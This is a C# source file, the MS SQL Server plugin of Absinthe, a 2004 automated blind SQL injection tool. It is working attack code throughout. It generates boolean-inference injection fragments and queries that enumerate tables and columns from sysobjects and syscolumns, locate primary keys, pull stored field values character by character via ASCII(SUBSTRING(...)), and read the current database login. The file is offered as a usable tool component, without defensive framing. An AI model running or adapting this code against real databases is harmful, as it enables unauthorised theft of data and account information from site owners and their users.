/*****************************************************************************
   Absinthe - The Automated Blind SQL Injection Tool
   This software is Copyright (C) 2004  nummish, 0x90.org

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
******************************************************************************/


using System.Text;
using System.Data;

public class AbsinthePlugin : Absinthe.Core.PluginTemplate
{

	// {{{ AndEqualWrapper
	public override string AndEqualWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") = ");

		return retVal.ToString();
	}
	// }}}

	// {{{ AndGreaterThanEqualWrapper
	public override string AndGreaterThanEqualWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") >= ");

		return retVal.ToString();
	}
	// }}}

	// {{{ AndGreaterThanWrapper
	public override string AndGreaterThanWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("AND (").Append(Value).Append(") > ");

		return retVal.ToString();
	}
	// }}}

	// {{{ NextLowestTableID
	public override string NextLowestTableID(long PrevTableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select MIN(id) from sysobjects where id > ").Append(PrevTableID);
		retVal.Append(" AND xtype=char(85)");

		return retVal.ToString();
	}
	// }}}

	// {{{ TableNameLength
	public override string TableNameLength(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select TOP 1 LEN(name) from sysobjects where id=").Append(TableID);
		retVal.Append(" AND xtype=char(85)");

		return retVal.ToString();
	}
	// }}}

	// {{{ TableNameCharacterValue
	public override string TableNameCharacterValue(long Index, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("select ASCII(SUBSTRING((name),").Append(Index).Append(",1)) from sysobjects where id=");
		retVal.Append(TableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfRecords
	public override string NumberOfRecords(string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(*) FROM ").Append(TableName);

		return retVal.ToString();
	}
	// }}}

	// {{{ PrimaryKeyColumn
	public override string PrimaryKeyColumn(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(colid) FROM sysconstraints WHERE id=").Append(TableID).Append(" AND status=1");

		return retVal.ToString();
	}
	// }}}

	// {{{ FieldDataType
	public override string FieldDataType(long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT TOP 1 (xtype) FROM syscolumns WHERE id=").Append(TableID).Append(" AND colid=").Append(FieldID);

		return retVal.ToString();
	}
	// }}}

	// {{{ FieldNameLength
	public override string FieldNameLength(long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT TOP 1 LEN(name) FROM syscolumns WHERE id=").Append(TableID).Append(" AND colid=").Append(FieldID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NextLowestFieldID
	public override string NextLowestFieldID(long TableID, long PrevFieldID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(colid) FROM syscolumns WHERE colid > ").Append(PrevFieldID).Append(" AND id=").Append(TableID);
		return retVal.ToString();
	}
	// }}}

	// {{{ FieldNameCharacterValue
	public override string FieldNameCharacterValue(long Index, long FieldID, long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTRING(name,").Append(Index).Append(",1)) FROM syscolumns where id=").Append(TableID);
		retVal.Append(" AND colid=").Append(FieldID);

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfTables
	public override string NumberOfTables()
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(name) FROM sysobjects WHERE xtype=char(85)");

		return retVal.ToString();
	}
	// }}}

	// {{{ NumberOfFieldsInTable
	public override string NumberOfFieldsInTable(long TableID)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT COUNT(name) FROM syscolumns WHERE id=").Append(TableID);

		return retVal.ToString();
	}
	// }}}

	// {{{ LengthOfConvertedPrimaryKeyValue
	public override string LengthOfConvertedPrimaryKeyValue(string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT LEN(CONVERT(VARCHAR,MIN(").Append(KeyName).Append("))) FROM ").Append(TableName);

		return retVal.ToString();
	}

	public override string LengthOfConvertedPrimaryKeyValue(string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(LengthOfConvertedPrimaryKeyValue(KeyName, TableName));
		retVal.Append(" WHERE ").Append(KeyName).Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ ConvertedPrimaryKeyValueCharacter
	public override string ConvertedPrimaryKeyValueCharacter(long Index, string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTRING(CONVERT(VARCHAR,").Append(KeyName).Append("),").Append(Index);
		retVal.Append(",1)) FROM ").Append(TableName);

		return retVal.ToString();
	}

	public override string ConvertedPrimaryKeyValueCharacter(long Index, string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(ConvertedPrimaryKeyValueCharacter(Index, KeyName, TableName)).Append(" WHERE ");
		retVal.Append(KeyName).Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ ConcatenationCharacter
	public override string ConcatenationCharacter
	{
		get
		{
			return "+";
		}
	}
	// }}}

	// {{{ CharConversionFunction
	public override string CharConversionFunction(long DecimalValue)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("char(").Append(DecimalValue).Append(")");
		return retVal.ToString();
	}
	// }}}

	// {{{ IntegerPrimaryKeyValue
	public override string IntegerPrimaryKeyValue(string KeyName, string TableName)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT MIN(").Append(KeyName).Append(") FROM ").Append(TableName);
		return retVal.ToString();
	}

	public override string IntegerPrimaryKeyValue(string KeyName, string TableName, string PrevKeyValue)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(IntegerPrimaryKeyValue(KeyName, TableName)).Append(" WHERE ").Append(KeyName);
		retVal.Append(">").Append(PrevKeyValue);

		return retVal.ToString();
	}
	// }}}

	// {{{ AndIsNullWrapper
	public override string AndIsNullWrapper(string Value)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append(" AND (").Append(Value).Append(") IS NULL ");
		return retVal.ToString();
	}
	// }}}

	// {{{ SelectValueForGivenPrimaryKey
	public override string SelectValueForGivenPrimaryKey(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("SELECT TOP 1 ").Append(FieldName).Append(" FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectLengthOfValueForGivenPrimaryKey
	public override string SelectLengthOfValueForGivenPrimaryKey(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();
		retVal.Append("SELECT TOP 1 LEN(").Append(FieldName).Append(") FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectCharacterValueForGivenPrimaryKey
	public override string SelectCharacterValueForGivenPrimaryKey(long Index, string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTRING(").Append(FieldName).Append(",").Append(Index).Append(",1)) FROM ");
		retVal.Append(TableName).Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectLengthOfConvertedRecordValue
	public override string SelectLengthOfConvertedRecordValue(string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT TOP 1 LEN(CONVERT(VarChar,").Append(FieldName).Append(")) FROM ").Append(TableName);
		retVal.Append(" WHERE ").Append(pk.Name).Append("=").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectCharacterValueForConvertedRecordValue
	public override string SelectCharacterValueForConvertedRecordValue(long Index, string FieldName, string TableName, Absinthe.Core.GlobalDS.PrimaryKey pk)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTRING(CONVERT(VarChar,").Append(FieldName).Append("),").Append(Index);
		retVal.Append(",1)) FROM ").Append(TableName).Append(" WHERE ").Append(pk.Name).Append(" = ").Append(pk.Value);

		return retVal.ToString();
	}
	// }}}

	// {{{ SelectDatabaseUsernameLength
	public override string SelectDatabaseUsernameLength()
	{
		return "SELECT LEN(a.loginame) FROM master..sysprocesses AS a WHERE a.spid = @@SPID";
	}
	// }}}

	// {{{ SelectCharacterFromDatabaseUsername
	public override string SelectCharacterFromDatabaseUsername(long Index)
	{
		StringBuilder retVal = new StringBuilder();

		retVal.Append("SELECT ASCII(SUBSTRING((a.loginame),").Append(Index);
		retVal.Append(",1)) FROM master..sysprocesses AS a WHERE a.spid = @@SPID");

		return retVal.ToString();
	}
	// }}}

	// {{{ PluginDisplayTargetName
	public override string PluginDisplayTargetName
	{
		get
		{
			return "MS SQL Server";
		}
	}
	// }}}
	
	// {{{ AuthorName
	public override string AuthorName
	{
		get
		{
			return "nummish";
		}
	}
	// }}}

	// {{{ ConvertNativeDataType 
	public override SqlDbType ConvertNativeDataType(long DataType)
	{
			switch (DataType)
			{
				case 56:
					return SqlDbType.Int;
				case 167:
					return SqlDbType.VarChar;
				case 175:
					return SqlDbType.Char;
				case 106: 
					return SqlDbType.Decimal;
				case 127:
					return SqlDbType.BigInt;
				case 173:
					return SqlDbType.Binary;
				case 104:
					return SqlDbType.Bit;
				case 61:
					return SqlDbType.DateTime;
				case 34:
					return SqlDbType.Image;
				case 60:
					return SqlDbType.Money;
				case 239:
					return SqlDbType.NChar;
				case 99:
					return SqlDbType.NText;
				case 108:
					// There's no Numeric type.. weird
					return SqlDbType.Variant;
				case 62:
					return SqlDbType.Float;
				case 231:
					return SqlDbType.NVarChar;
				case 59:
					return SqlDbType.Real;
				case 58:
					return SqlDbType.SmallDateTime;
				case 52:
					return SqlDbType.SmallInt;
				case 122:
					return SqlDbType.SmallMoney;
				case 35:
					return SqlDbType.Text;
				case 189:
					return SqlDbType.Timestamp;
				case 48:
					return SqlDbType.TinyInt;
				case 36:
					return SqlDbType.UniqueIdentifier;
				case 165:
					return SqlDbType.VarBinary;
				
			}

			return SqlDbType.Variant;
	}
	// }}}
}
